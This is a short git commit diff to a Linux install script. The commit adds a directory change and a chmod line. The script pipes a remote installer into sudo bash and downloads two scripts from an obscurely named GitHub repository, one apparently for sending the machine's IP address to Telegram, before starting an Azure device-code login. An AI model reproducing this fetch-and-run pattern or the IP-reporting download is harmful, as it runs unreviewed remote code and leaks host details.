e02f32c76db117443ab05170efd34043dd51fae9
samuraifinseev <155964563+samuraifinseev@users.noreply.github.com>
2024-07-06 04:17:29 +0500

    Update install_pack_linux.sh

--- install_pack_linux.sh
+++ install_pack_linux.sh
@@ -1,7 +1,9 @@
 # !/bin/bash
+cd /home/azureuser
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
 sudo apt install python3-pip -y
 wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/script_linux.sh
+chmod +x script_linux.sh
 wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/linux_send_ip_to_tg.py
 pip3 install serviceping -y
 az login --use-device-code
